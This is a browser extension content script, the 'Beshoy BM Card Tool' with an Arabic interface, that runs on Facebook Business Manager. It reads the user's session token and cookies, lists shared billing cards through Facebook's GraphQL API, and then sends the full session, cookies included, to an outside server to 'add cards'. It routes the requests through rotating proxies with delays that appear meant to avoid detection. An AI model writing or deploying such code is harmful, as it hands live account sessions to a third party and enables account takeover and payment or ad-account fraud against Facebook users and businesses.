// ═══════════════════════════════════════════════════════
//  CONTENT SCRIPT — Beshoy BM Card Tool
//  يعمل على business.facebook.com
//  - يحقن الـ UI كـ floating panel
//  - يستخدم background.js لطلبات السيرفر الخارجي
// ═══════════════════════════════════════════════════════

(function () {
  'use strict';

  // ── State ──────────────────────────────────────────
  let toolOpen = false;
  let settings = { delay: 1, proxy: '', serverUrl: '' };
  let pxStatus = 'unknown'; // 'unknown' | 'ok' | 'fail' | 'server'

  // ── Listen for popup messages ───────────────────────
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.type === 'TOGGLE_TOOL') {
      if (toolOpen) {
        closeTool();
      } else {
        openTool();
      }
      sendResponse({ ok: true });
    }
    return false;
  });

  // ── Background relay: server API calls ─────────────
  function bgFetch(path, body, headers = {}) {
    return new Promise((resolve, reject) => {
      chrome.runtime.sendMessage(
        { type: 'SERVER_FETCH', path, method: 'POST', body, headers },
        (resp) => {
          if (chrome.runtime.lastError) {
            reject(new Error(chrome.runtime.lastError.message));
            return;
          }
          if (resp?.ok) resolve(resp.data);
          else reject(new Error(resp?.error || `Server error ${resp?.status}`));
        }
      );
    });
  }

  // ── Load settings from chrome.storage ───────────────
  async function loadSettings() {
    return new Promise(resolve => {
      chrome.storage.local.get(['delay', 'proxy', 'serverUrl', 'proxyStatus', 'apiKey'], d => {
        resolve({
          delay:     d.delay     ?? 1,
          proxy:     d.proxy     || '',
          serverUrl: d.serverUrl || 'https://3000-6a8836a626efe92ac86e3a51-191f73d386a798a0b228f164.imported.base44-preview.app',
          proxyStatus: d.proxyStatus || 'unknown',
          apiKey: d.apiKey || '',
        });
      });
    });
  }

  // ── Extract FB session via inject-main.js (MAIN world) ──
  // Session data is extracted by inject-main.js, which runs in the page's
  // MAIN world (see manifest.json "world":"MAIN"). We just ask it via
  // postMessage — no more injecting a <script> tag into the DOM, which
  // Facebook's CSP was silently blocking (that's why every request came
  // back with empty user/business/token and "billing account not found").
  function extractFBSession() {
    return new Promise(resolve => {
      const id = '__bsh_' + Date.now();
      const handler = (e) => {
        if (e.source !== window) return;
        if (e.data?.__bsh === id) {
          window.removeEventListener('message', handler);
          resolve(e.data.payload || {});
        }
      };
      window.addEventListener('message', handler);
      window.postMessage({ __bshReq: true, id }, '*');
      setTimeout(() => {
        window.removeEventListener('message', handler);
        resolve({});
      }, 3000);
    });
  }

  // ── CSS ─────────────────────────────────────────────
  const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
#bsh-root *{box-sizing:border-box!important}
@keyframes bsh-glow{0%,100%{text-shadow:0 0 10px #00ffc8,0 0 22px rgba(0,255,200,.35)}50%{text-shadow:0 0 18px #00ffc8,0 0 40px rgba(0,255,200,.55)}}
@keyframes bsh-pulse{0%,100%{opacity:1;box-shadow:0 0 6px currentColor}50%{opacity:.3;box-shadow:none}}
@keyframes bsh-led-glow{
  0%,100%{box-shadow:0 0 5px currentColor,0 0 10px currentColor;transform:scale(1)}
  50%{box-shadow:0 0 12px currentColor,0 0 24px currentColor,0 0 36px rgba(0,255,200,.3);transform:scale(1.2)}
}
@keyframes bsh-led-red{
  0%,100%{box-shadow:0 0 5px #ff5050,0 0 10px #ff5050}
  50%{box-shadow:0 0 10px #ff5050,0 0 20px rgba(255,80,80,.4)}
}

/* ── Launcher ── */
#bshLauncher{
  position:fixed!important;bottom:20px;right:20px;z-index:2147483640!important;
  background:#0c1f18;border:1.5px solid rgba(0,255,200,.4);border-radius:40px;
  padding:0 16px;height:40px;display:flex;align-items:center;gap:8px;
  cursor:pointer;font-family:'Inter',sans-serif;white-space:nowrap;user-select:none;
  transition:all .25s;box-shadow:0 0 18px rgba(0,255,200,.12);
}
#bshLauncher:hover{border-color:rgba(0,255,200,.85);box-shadow:0 0 26px rgba(0,255,200,.28)}
#bshLauncher span{font-size:12px;font-weight:900;letter-spacing:3px;color:#00ffc8;text-transform:uppercase}
.bfl{width:6px;height:6px;border-radius:50%;animation:bsh-pulse 1.8s infinite}
.bfl.green{background:#00ffc8;color:#00ffc8;animation:bsh-led-glow 2s ease-in-out infinite}
.bfl.blue{background:#3b9eff;color:#3b9eff;animation-delay:.5s}
.bfl.gray{background:#3a3a3a;animation:none}
.bfl.red{background:#ff5050;color:#ff5050;animation:bsh-led-red 1.5s ease-in-out infinite}

/* ── Overlay ── */
#bshOverlay{
  position:fixed!important;inset:0;
  background:rgba(0,0,0,.7);backdrop-filter:blur(5px);
  z-index:2147483638!important;
}

/* ── Panel ── */
#bshPanel{
  position:fixed!important;top:50%;left:50%;transform:translate(-50%,-50%);
  width:92%;max-width:390px;z-index:2147483639!important;
  overflow:hidden;font-family:'Inter',sans-serif;
  border-radius:16px;border:1px solid rgba(0,255,200,.13);
  box-shadow:0 28px 70px rgba(0,0,0,.75),0 0 0 1px rgba(0,255,200,.04);
}

/* ─ Header ─ */
.bsh-hdr{
  background:#0b1e16;border-bottom:2px solid rgba(0,255,200,.18);
  padding:10px 13px;display:flex;align-items:center;justify-content:space-between;
}
.bsh-hdr-l{display:flex;align-items:center;gap:10px}
.bsh-leds{display:flex;gap:4px;align-items:center}
.bld{width:7px;height:7px;border-radius:50%;animation:bsh-pulse 1.8s infinite}
.bld.green{background:#00ffc8;color:#00ffc8}
.bld.blue{background:#3b9eff;animation-delay:.5s}
.bld.red{background:#ff5050}
.bld.gray{background:#2e2e2e;animation:none}
.bsh-name{
  font-size:15px;font-weight:900;letter-spacing:3.5px;color:#00ffc8;
  text-transform:lowercase;animation:bsh-glow 3s ease-in-out infinite;
}
.bsh-sep{width:1px;height:14px;background:rgba(255,255,255,.1);margin:0 2px}
.bsh-sub{font-size:8.5px;color:rgba(255,255,255,.25);letter-spacing:1.3px;text-transform:uppercase}
.bsh-hdr-r{display:flex;align-items:center;gap:6px}
#bshSettBtn{
  background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);
  border-radius:6px;color:rgba(255,255,255,.38);font-size:13px;cursor:pointer;
  padding:3px 8px;transition:all .2s;line-height:1;font-family:'Inter',sans-serif;
}
#bshSettBtn:hover{background:rgba(255,255,255,.11);color:#fff}
#bshClose{
  width:22px;height:22px;background:rgba(255,255,255,.04);
  border:1px solid rgba(255,255,255,.07);border-radius:50%;
  display:flex;align-items:center;justify-content:center;
  font-size:10px;cursor:pointer;color:rgba(255,255,255,.3);transition:all .2s;
}
#bshClose:hover{background:rgba(255,55,55,.22);color:#ff5050;border-color:rgba(255,55,55,.3)}

/* ─ Status ─ */
.bsh-st{
  background:#080808;border-bottom:1px solid rgba(255,255,255,.05);
  padding:7px 14px;display:flex;align-items:center;gap:8px;min-height:33px;
}
.bsh-dot{width:7px;height:7px;border-radius:50%;background:#1e1e1e;flex-shrink:0;transition:all .3s}
.bsh-st.working .bsh-dot{background:#f5a623;animation:bsh-pulse 1s infinite}
.bsh-st.success .bsh-dot{background:#00ffc8;box-shadow:0 0 8px #00ffc8}
.bsh-st.error   .bsh-dot{background:#ff5050;box-shadow:0 0 8px #ff5050}
.bsh-st-txt{font-size:11px;color:rgba(255,255,255,.38);line-height:1.4}

/* ─ Select all bar ─ */
.bsh-selbar{
  background:#0c1e0d;border-bottom:1px solid rgba(0,255,200,.11);
  padding:8px 14px;display:flex;align-items:center;gap:9px;cursor:pointer;transition:background .15s;
}
.bsh-selbar:hover{background:#112514}
.bsh-selbar input{width:13px;height:13px;accent-color:#00ffc8;cursor:pointer;flex-shrink:0}
.bsh-selbar label{font-size:11px;font-weight:700;color:#00ffc8;letter-spacing:.8px;cursor:pointer;user-select:none;flex:1}
.bsh-cnt{background:rgba(0,255,200,.1);color:#00ffc8;font-size:10px;font-weight:700;padding:2px 9px;border-radius:20px}

/* ─ Cards list ─ */
.bsh-cards{
  background:#060909;border-bottom:2px solid rgba(255,255,255,.045);
  max-height:158px;overflow-y:auto;scrollbar-width:thin;scrollbar-color:rgba(0,255,200,.13) transparent;
}
.bsh-card{
  display:flex;align-items:center;gap:9px;padding:9px 14px;
  border-bottom:1px solid rgba(255,255,255,.025);cursor:pointer;transition:background .12s;
}
.bsh-card:last-child{border-bottom:none}
.bsh-card:hover{background:rgba(255,255,255,.018)}
.bsh-card.selected{background:rgba(0,255,200,.04)}
.bsh-card.processed{opacity:.28}
.bsh-card input{width:13px;height:13px;accent-color:#00ffc8;cursor:pointer;flex-shrink:0}
.bsh-card-ico{font-size:18px;width:24px;text-align:center;flex-shrink:0}
.bsh-card-name{font-size:12px;font-weight:600;color:#d4d4d4}
.bsh-card-num{font-size:10px;color:rgba(255,255,255,.2);margin-top:1px}

/* ─ Proxy bar ─ */
.bsh-pxbar{
  background:#08101e;border-top:1px solid rgba(59,155,255,.07);
  border-bottom:1px solid rgba(59,155,255,.14);
  padding:7px 14px;display:flex;align-items:center;gap:7px;
}
/* ─── THE PROXY LED ─── */
.bsh-pxled{
  width:9px;height:9px;border-radius:50%;flex-shrink:0;
  transition:background .4s,box-shadow .4s;
  background:#252535;
}
/* Gray (لا يوجد بروكسي) */
.bsh-pxled.none{background:#252535;box-shadow:none}
/* Green pulsing glow (بروكسي يعمل — user أو server) */
.bsh-pxled.ok{
  background:#00ffc8;color:#00ffc8;
  animation:bsh-led-glow 2s ease-in-out infinite;
}
/* Server rotation — cyan dim */
.bsh-pxled.server{
  background:#3b9eff;color:#3b9eff;
  animation:bsh-led-glow 2.5s ease-in-out infinite;
}
/* Red fail */
.bsh-pxled.fail{
  background:#ff5050;color:#ff5050;
  animation:bsh-led-red 1.5s ease-in-out infinite;
}
.bsh-pxtxt{font-size:10px;color:rgba(255,255,255,.26);flex:1;font-family:'Inter',sans-serif}
.bsh-pxtype{
  font-size:9px;font-weight:700;padding:2px 7px;border-radius:10px;
  background:rgba(59,155,255,.13);color:#3b9eff;letter-spacing:.4px;
}

/* ─ Timer ─ */
.bsh-timer{background:#130f00;border-bottom:1px solid rgba(245,166,35,.14);padding:6px 14px;font-size:11px;color:#f5a623;text-align:center;font-weight:600;display:none}
.bsh-timer.on{display:block}

/* ─ Progress ─ */
.bsh-prog{background:#070707;border-bottom:1px solid rgba(255,255,255,.04);padding:7px 14px;display:none}
.bsh-prog.on{display:block}
.bsh-prog-track{height:2px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden}
.bsh-prog-fill{height:100%;background:linear-gradient(90deg,#00ffc8,#3b9eff);width:0%;border-radius:2px;transition:width .5s ease}

/* ─ Status 2 ─ */
/* reuse .bsh-st */

/* ─ Action ─ */
.bsh-act{background:#0c1910;border-top:1px solid rgba(0,255,200,.07);padding:11px 14px}
.bsh-btn{
  width:100%;height:40px;border:none;border-radius:10px;
  font-size:12px;font-weight:700;letter-spacing:1.5px;cursor:pointer;
  background:linear-gradient(135deg,#00ffc8,#00b89e);color:#040f09;
  font-family:'Inter',sans-serif;transition:all .2s;
}
.bsh-btn:hover{transform:translateY(-1px);box-shadow:0 5px 20px rgba(0,255,200,.32)}
.bsh-btn:disabled{background:#161616;color:#2a2a2a;cursor:not-allowed;transform:none;box-shadow:none}

/* ─ Settings modal ─ */
.bsh-modal{position:fixed!important;inset:0;background:rgba(0,0,0,.82);display:flex;align-items:center;justify-content:center;z-index:2147483647!important}
.bsh-modal-box{background:#0f0f0f;border:1px solid rgba(0,255,200,.2);border-radius:14px;padding:20px;width:90%;max-width:320px}
.bsh-modal-box h3{color:#00ffc8;margin-bottom:16px;font-size:12px;font-weight:900;text-align:center;letter-spacing:2.5px;text-transform:uppercase;text-shadow:0 0 12px rgba(0,255,200,.5)}
.bsh-fl{font-size:9px;color:#3e3e3e;letter-spacing:.9px;margin-bottom:4px;margin-top:13px;text-transform:uppercase}
.bsh-modal-box input{width:100%;padding:8px 11px;background:#0a0a0a;border:1px solid rgba(255,255,255,.07);border-radius:8px;color:#e0e0e0;font-size:12px;outline:none;font-family:'Inter',sans-serif}
.bsh-modal-box input:focus{border-color:rgba(0,255,200,.38)}
.bsh-px-st{background:#08101e;border:1px solid rgba(59,155,255,.12);border-radius:8px;padding:7px 11px;margin-top:8px;display:flex;align-items:center;gap:8px}
.bsh-px-st-led{width:8px;height:8px;border-radius:50%;flex-shrink:0;background:#252535;transition:all .3s}
.bsh-px-st-led.ok{background:#00ffc8;animation:bsh-led-glow 2s ease-in-out infinite;color:#00ffc8}
.bsh-px-st-led.fail{background:#ff5050;animation:bsh-led-red 1.5s ease-in-out infinite}
.bsh-px-st-txt{font-size:10px;color:rgba(255,255,255,.33);flex:1}
.bsh-modal-btns{display:flex;gap:7px;margin-top:16px}
.bsh-modal-btns button{flex:1;padding:9px;border-radius:8px;border:none;font-weight:700;cursor:pointer;font-size:11px;letter-spacing:.5px;font-family:'Inter',sans-serif}
.bsh-btn-sv{background:#00ffc8;color:#040f09}
.bsh-btn-cx{background:rgba(255,255,255,.06);color:#555}
.bsh-btn-ck{background:rgba(59,155,255,.1);color:#3b9eff;border:1px solid rgba(59,155,255,.2)!important;flex:.75!important}
`;

  // ── Build UI ─────────────────────────────────────────
  async function openTool() {
    if (toolOpen) return;
    toolOpen = true;

    // Load settings fresh
    settings = await loadSettings();
    pxStatus = settings.proxyStatus || 'unknown';

    // Inject CSS once
    if (!document.getElementById('bsh-style')) {
      const style = document.createElement('style');
      style.id = 'bsh-style';
      style.textContent = CSS;
      document.head.appendChild(style);
    }

    // Create launcher button
    if (!document.getElementById('bshLauncher')) {
      const launcher = document.createElement('div');
      launcher.id = 'bshLauncher';
      launcher.innerHTML = `<div class="bfl gray" id="bshLL1"></div><div class="bfl blue"></div><span>beshoy</span>`;
      launcher.onclick = () => { if (toolOpen) closeTool(); else openPanel(); };
      document.body.appendChild(launcher);
    }
    updateLauncherLed();

    // Open the main panel
    openPanel();
  }

  function updateLauncherLed() {
    const l1 = document.getElementById('bshLL1');
    if (!l1) return;
    if (!settings.proxy) {
      l1.className = 'bfl green';
    } else {
      l1.className = 'bfl ' + (pxStatus === 'ok' ? 'green' : pxStatus === 'fail' ? 'red' : 'blue');
    }
  }

  function updatePxBar(state, label, type = '') {
    pxStatus = state;
    const led = document.getElementById('bshPxLed');
    const txt = document.getElementById('bshPxTxt');
    const badge = document.getElementById('bshPxType');
    if (led) {
      led.className = 'bsh-pxled ' + (
        state === 'ok'     ? 'ok' :
        state === 'fail'   ? 'fail' :
        state === 'server' ? 'server' : 'none'
      );
    }
    if (txt) txt.textContent = label;
    if (badge && type) { badge.textContent = type; badge.style.display = ''; }
    else if (badge) badge.style.display = 'none';
    updateLauncherLed();
  }

  function openPanel() {
    if (document.getElementById('bshPanel')) return;

    // Overlay
    const overlay = document.createElement('div');
    overlay.id = 'bshOverlay';
    document.body.appendChild(overlay);

    // Panel
    const panel = document.createElement('div');
    panel.id = 'bshPanel';

    // Initial proxy bar label
    const pxBarLabel = settings.proxy
      ? (pxStatus === 'ok' ? 'بروكسي شخصي • متصل ✓' : pxStatus === 'fail' ? 'بروكسي شخصي • لا يعمل' : 'بروكسي شخصي (غير محقق)')
      : 'بروكسي السيرفر (rotation)';
    const pxLedClass = settings.proxy
      ? (pxStatus === 'ok' ? 'ok' : pxStatus === 'fail' ? 'fail' : 'none')
      : 'server';

    panel.innerHTML = `
<div class="bsh-hdr">
  <div class="bsh-hdr-l">
    <div class="bsh-leds"><div class="bld green"></div><div class="bld blue"></div><div class="bld gray" id="bshHLed3"></div></div>
    <span class="bsh-name">beshoy</span>
    <div class="bsh-sep"></div>
    <span class="bsh-sub">BM Card Tool</span>
  </div>
  <div class="bsh-hdr-r">
    <button id="bshSettBtn">⚙</button>
    <div id="bshClose">✕</div>
  </div>
</div>
<div class="bsh-st working" id="bshSt">
  <div class="bsh-dot"></div>
  <span class="bsh-st-txt" id="bshStTxt">⏳ جاري جلب البطاقات...</span>
</div>`;
    document.body.appendChild(panel);

    const closeFn = () => closeTool();
    overlay.onclick = closeFn;
    document.getElementById('bshClose').onclick = closeFn;
    document.getElementById('bshSettBtn').onclick = () => openSettings(panel);

    // Extract session then load cards
    extractFBSession().then(sess => {
      loadCards(panel, sess, pxBarLabel, pxLedClass);
    });
  }

  // ── Parse FB GraphQL response (strips "for (;;);" JSON-hijack prefix) ──
  async function parseFbJson(res) {
    const txt = await res.text();
    const clean = txt.replace(/^for \(;;\);/, '');
    return JSON.parse(clean);
  }

  // ── Load Cards ───────────────────────────────────────
  async function loadCards(panel, rawSess, pxBarLabel, pxLedClass) {
    const setSt = (msg, cls = '') => {
      const el = document.getElementById('bshSt');
      const t  = document.getElementById('bshStTxt');
      if (el) el.className = 'bsh-st ' + cls;
      if (t)  t.innerHTML = msg;
    };

    const cookies = rawSess.cookies || document.cookie;
    const { usr = '', ad = '', bm: bmRaw = '', tok = '', lsd = '', dyn = '', csr = '', hs = '', hsi = '',
      hsdp = '', hblp = '', sjsp = '', sr = '', sb = '', spin_t = '', creq = '15' } = rawSess;

    let bm = bmRaw;
    if (!bm) {
      try {
        bm = new URL(location.href).searchParams.get('business_id')
          || location.pathname.match(/\/(\d{10,})/)?.[1]
          || '';
      } catch {}
    }

    const sess = { user: usr, ad, bm, token: tok, lsd, dyn, csr, hs, hsi, hsdp, hblp, sjsp,
      spin_r: sr, spin_b: sb, spin_t: spin_t || String(Math.floor(Date.now() / 1000)),
      comet_req: creq, cookies };

    // Wake-up ping (silent)
    bgFetch('/add-cards', { session: sess, cards: [], delaySec: 0 }, { 'x-api-key': settings.apiKey || '' }).catch(() => {});

    try {
      // Step 1: get billing account ID
      const r1 = await fetch('https://business.facebook.com/api/graphql/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        credentials: 'include',
        body: `av=${usr}&__aaid=${ad}&__bid=${bm}&__user=${usr}&__a=1&fb_dtsg=${tok}&jazoest=25619&lsd=x&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BillingHubPaymentMethodsViewQuery&variables={"businessID":"${bm}"}&server_timestamps=true&doc_id=23945721255021756`,
      });
      const j1 = await parseFbJson(r1);
      const bmadid = j1?.data?.business?.billing_payment_account?.id;
      if (!bmadid) {
        console.log('[BSH DEBUG] bm=', bm, 'usr=', usr, 'j1=', j1);
        throw new Error('لم يتم العثور على حساب الفوترة — افتح الكونسول (F12) وابعتلي اللي طلع بعد [BSH DEBUG]');
      }

      // Step 2: get payment methods
      const r2 = await fetch('https://business.facebook.com/api/graphql/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        credentials: 'include',
        body: `av=${usr}&__aaid=${ad}&__bid=${bm}&__user=${usr}&fb_dtsg=${tok}&jazoest=25243&lsd=x&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BillingHubPaymentMethodsBusinessSectionQuery&variables={"paymentAccountID":"${bmadid}","billable_account_types":["FB_ADS","WHATSAPP"],"connected_asset_limit":26,"connected_asset_detail_limit":5}&server_timestamps=true&doc_id=24585166657733775`,
      });
      const j2 = await parseFbJson(r2);
      const methods = j2?.data?.payment_account?.billing_payment_methods;
      if (!methods?.length) throw new Error('لا توجد بطاقات قابلة للإضافة في هذا الحساب');

      const cards = methods
        .map(m => ({ ...m.credential, sharedId: m.credential.shared_biz_credential_id || m.credential.credential_id, name: m.credential.card_association_name, last4: m.credential.last_four_digits }))
        .filter(c => c.sharedId);

      if (!cards.length) throw new Error('لا توجد بطاقات مشتركة متاحة');

      renderCards(panel, cards, sess, pxBarLabel, pxLedClass);
      setSt('✅ البطاقات جاهزة — اختر وأضف', 'success');

    } catch (err) {
      setSt(`❌ ${err.message}`, 'error');
    }
  }

  // ── Render Cards UI ──────────────────────────────────
  function renderCards(panel, cards, sess, pxBarLabel, pxLedClass) {
    const icon = n => {
      const x = (n || '').toLowerCase();
      return x.includes('visa') ? '💙' : x.includes('master') ? '🔴' : x.includes('amex') ? '🟡' : '💳';
    };

    const frag = document.createElement('div');
    frag.innerHTML = `
<div class="bsh-selbar" id="bshSelBar">
  <input type="checkbox" id="bshChkAll">
  <label for="bshChkAll">تحديد جميع الكروت</label>
  <span class="bsh-cnt" id="bshCnt">0 / ${cards.length}</span>
</div>
<div class="bsh-cards" id="bshCardList">
  ${cards.map((c, i) => `<div class="bsh-card" data-id="${c.sharedId}">
    <input type="checkbox" class="bsh-chk" value="${c.sharedId}" data-i="${i}">
    <span class="bsh-card-ico">${icon(c.name)}</span>
    <div><div class="bsh-card-name">${c.name}</div><div class="bsh-card-num">•••• •••• •••• ${c.last4}</div></div>
  </div>`).join('')}
</div>
<div class="bsh-pxbar">
  <div class="bsh-pxled ${pxLedClass}" id="bshPxLed"></div>
  <span class="bsh-pxtxt" id="bshPxTxt">${pxBarLabel}</span>
  <span class="bsh-pxtype" id="bshPxType" style="display:none"></span>
</div>
<div class="bsh-timer" id="bshTimer">⏳ انتظر <span id="bshTimerSec">${settings.delay}</span> ثانية...</div>
<div class="bsh-prog" id="bshProg"><div class="bsh-prog-track"><div class="bsh-prog-fill" id="bshProgFill"></div></div></div>
<div class="bsh-st" id="bshSt2"><div class="bsh-dot"></div><span class="bsh-st-txt" id="bshStTxt2">اختر بطاقة واحدة أو أكثر ثم اضغط ADD CARDS</span></div>
<div class="bsh-act"><button class="bsh-btn" id="bshBtnAdd">⚡ ADD CARDS</button></div>`;

    while (frag.firstChild) panel.appendChild(frag.firstChild);

    // ── Selection logic ──
    const chkAll   = document.getElementById('bshChkAll');
    const cntBadge = document.getElementById('bshCnt');
    const cardList = document.getElementById('bshCardList');
    const allChks  = () => cardList.querySelectorAll('.bsh-chk');

    const updCount = () => {
      const checked = [...allChks()].filter(c => c.checked);
      cntBadge.textContent = `${checked.length} / ${cards.length}`;
      chkAll.checked = checked.length === cards.length;
      chkAll.indeterminate = checked.length > 0 && checked.length < cards.length;
      cardList.querySelectorAll('.bsh-card').forEach(row => {
        row.classList.toggle('selected', row.querySelector('input').checked);
      });
    };

    document.getElementById('bshSelBar').addEventListener('click', e => {
      if (e.target.id === 'bshChkAll') return;
      chkAll.checked = !chkAll.checked;
      allChks().forEach(c => c.checked = chkAll.checked);
      updCount();
    });
    chkAll.addEventListener('change', () => { allChks().forEach(c => c.checked = chkAll.checked); updCount(); });
    cardList.addEventListener('click', e => {
      const row = e.target.closest('.bsh-card');
      if (!row) return;
      const chk = row.querySelector('.bsh-chk');
      if (e.target === chk) return;
      chk.checked = !chk.checked;
      updCount();
    });
    cardList.addEventListener('change', e => { if (e.target.classList.contains('bsh-chk')) updCount(); });

    const setSt2 = (msg, cls = '') => {
      const el = document.getElementById('bshSt2');
      const t  = document.getElementById('bshStTxt2');
      if (el) el.className = 'bsh-st ' + cls;
      if (t)  t.innerHTML = msg;
    };

    // ── ADD CARDS ──
    document.getElementById('bshBtnAdd').onclick = async function () {
      const selected = [...allChks()].filter(c => c.checked);
      if (!selected.length) { setSt2('⚠️ يرجى تحديد بطاقة واحدة على الأقل', 'error'); return; }

      const queue = selected.map(el => {
        const card = cards.find(c => c.sharedId === el.value);
        return { sharedId: el.value, label: `${card?.name || '?'} •••• ${card?.last4 || '???'}` };
      });

      const btn       = document.getElementById('bshBtnAdd');
      const prog      = document.getElementById('bshProg');
      const progFill  = document.getElementById('bshProgFill');

      btn.disabled = true;
      btn.textContent = '⏳ جاري المعالجة...';
      prog.classList.add('on');
      setSt2(`⚡ إرسال ${queue.length} بطاقة للسيرفر...`, 'working');

      // Update proxy bar to show pending state
      updatePxBar(pxStatus, 'جاري إرسال الطلب عبر ' + (settings.proxy ? 'بروكسي شخصي' : 'بروكسيات السيرفر') + '...');

      try {
        // Re-extract the session right before sending — fb_dtsg (and other
        // tokens) rotate on Facebook's side, so reusing the session captured
        // when the panel first opened can be stale by the time the user
        // picks cards and clicks ADD. A stale token gets rejected by FB with
        // a generic "Log in to continue" error, which looks like a cookie
        // problem but isn't.
        const freshRaw = await extractFBSession();
        const freshSess = Object.keys(freshRaw).length ? {
          user: freshRaw.usr || sess.user,
          ad: freshRaw.ad || sess.ad,
          bm: freshRaw.bm || sess.bm,
          token: freshRaw.tok || sess.token,
          dyn: freshRaw.dyn || sess.dyn,
          csr: freshRaw.csr || sess.csr,
          hs: freshRaw.hs || sess.hs,
          hsi: freshRaw.hsi || sess.hsi,
          hsdp: freshRaw.hsdp || sess.hsdp,
          hblp: freshRaw.hblp || sess.hblp,
          sjsp: freshRaw.sjsp || sess.sjsp,
          spin_r: freshRaw.sr || sess.spin_r,
          spin_b: freshRaw.sb || sess.spin_b,
          spin_t: freshRaw.spin_t || sess.spin_t,
          comet_req: freshRaw.creq || sess.comet_req,
          cookies: freshRaw.cookies || document.cookie,
        } : { ...sess, cookies: document.cookie };

        const data = await bgFetch('/add-cards', {
          session: freshSess,
          cards: queue,
          delaySec: settings.delay,
          proxy: settings.proxy || undefined,
        });

        // ── Update proxy LED based on server response ──
        if (data.proxySource === 'user') {
          updatePxBar('ok', `✓ بروكسي شخصي مستخدم: ${data.proxyUsed}`, data.proxyUsed?.split(' ')[0] || '');
        } else if (data.proxySource?.startsWith('server:')) {
          updatePxBar('server', `✓ بروكسي السيرفر: ${data.proxyUsed}`, 'SERVER');
        } else {
          updatePxBar('none', 'بدون بروكسي (مباشر)');
        }

        // Animate progress
        data.results.forEach((r, idx) => {
          const row = cardList.querySelector(`[data-id="${r.sharedId}"]`);
          row?.classList?.add('processed');
          progFill.style.width = `${(idx + 1) / data.results.length * 100}%`;
        });
        progFill.style.width = '100%';

        // Debug: log full response to see failure reasons
        const failures = data.results?.filter(r => !r.success) || [];
        if (failures.length) {
          console.log('[BSH ADD-CARDS FAILURES]', JSON.stringify(failures, null, 2));
        }

        const ok    = data.successCount;
        const total = data.total;
        setSt2(
          `🎉 اكتمل! ${ok}/${total} نجح${ok < total ? ' · ' + (total - ok) + ' فشل' : ''}`,
          ok === total ? 'success' : 'error'
        );

      } catch (err) {
        setSt2(`❌ خطأ في الاتصال بالسيرفر: ${err.message}`, 'error');
        updatePxBar('fail', '❌ فشل الإرسال');
      }

      btn.disabled = false;
      btn.innerHTML = '⚡ ADD CARDS';
    };

    updCount();
  }

  // ── Settings modal ───────────────────────────────────
  function openSettings(panel) {
    if (document.getElementById('bshModal')) return;
    const modal = document.createElement('div');
    modal.className = 'bsh-modal';
    modal.id = 'bshModal';

    const pxLedCls = pxStatus === 'ok' ? 'ok' : pxStatus === 'fail' ? 'fail' : '';
    const pxStTxt  = settings.proxy
      ? (pxStatus === 'ok' ? 'متصل ✓' : pxStatus === 'fail' ? 'لا يعمل' : 'غير محقق')
      : 'بروكسي السيرفر (افتراضي)';

    modal.innerHTML = `<div class="bsh-modal-box">
  <h3>⚙ الإعدادات</h3>
  <div class="bsh-fl">التأخير بين كل بطاقة (ثانية)</div>
  <input id="bshDelayInp" type="number" min="0" max="60" value="${settings.delay}" placeholder="1"/>
  <div class="bsh-fl">بروكسي شخصي — يُفضَّل على بروكسيات السيرفر</div>
  <input id="bshPxInp" value="${settings.proxy}" placeholder="http://user:pass@host:port  أو  socks5://host:port"/>
  <div class="bsh-px-st">
    <div class="bsh-px-st-led ${pxLedCls}" id="bshPxStLed"></div>
    <span class="bsh-px-st-txt" id="bshPxStTxt">${pxStTxt}</span>
  </div>
  <div class="bsh-modal-btns">
    <button class="bsh-btn-ck" id="bshCkBtn">🔍 فحص</button>
    <button class="bsh-btn-sv" id="bshSvBtn">💾 حفظ</button>
    <button class="bsh-btn-cx" id="bshCxBtn">إلغاء</button>
  </div>
</div>`;
    document.body.appendChild(modal);

    // Check proxy
    document.getElementById('bshCkBtn').onclick = async () => {
      const px  = document.getElementById('bshPxInp').value.trim();
      const led = document.getElementById('bshPxStLed');
      const txt = document.getElementById('bshPxStTxt');
      if (!px) { txt.textContent = 'أدخل بروكسي أولاً'; return; }
      led.className = 'bsh-px-st-led';
      txt.textContent = '⏳ جاري الفحص...';
      try {
        const d = await bgFetch('/check-proxy', { proxy: px });
        if (d.ok) {
          led.className = 'bsh-px-st-led ok';
          txt.textContent = `✓ شغال — ${d.type || 'HTTP'}${d.hasAuth ? ' 🔐' : ''}  ${d.host}:${d.port}`;
          pxStatus = 'ok';
          updatePxBar('ok', `بروكسي شخصي • متصل ✓`, d.type || 'HTTP');
          chrome.storage.local.set({ proxyStatus: 'ok', proxyType: d.type || '' });
        } else {
          led.className = 'bsh-px-st-led fail';
          txt.textContent = '❌ ' + (d.error || 'لا يعمل');
          pxStatus = 'fail';
          updatePxBar('fail', 'بروكسي شخصي • لا يعمل');
          chrome.storage.local.set({ proxyStatus: 'fail', proxyType: '' });
        }
      } catch (e) {
        led.className = 'bsh-px-st-led fail';
        txt.textContent = '❌ ' + e.message;
        pxStatus = 'fail';
        updatePxBar('fail', 'خطأ في الفحص');
      }
      updateLauncherLed();
    };

    // Save
    document.getElementById('bshSvBtn').onclick = () => {
      const d = parseInt(document.getElementById('bshDelayInp').value) || 0;
      const p = document.getElementById('bshPxInp').value.trim();
      settings.delay = d;
      settings.proxy = p;
      chrome.storage.local.set({ delay: d, proxy: p });
      if (!p) {
        pxStatus = 'unknown';
        updatePxBar('server', 'بروكسي السيرفر (rotation)');
      }
      updateLauncherLed();
      modal.remove();
    };

    document.getElementById('bshCxBtn').onclick = () => modal.remove();
    modal.addEventListener('click', e => { if (e.target === modal) modal.remove(); });
  }

  // ── Close Tool ───────────────────────────────────────
  function closeTool() {
    toolOpen = false;
    document.getElementById('bshPanel')?.remove();
    document.getElementById('bshOverlay')?.remove();
    document.getElementById('bshModal')?.remove();
  }

})();
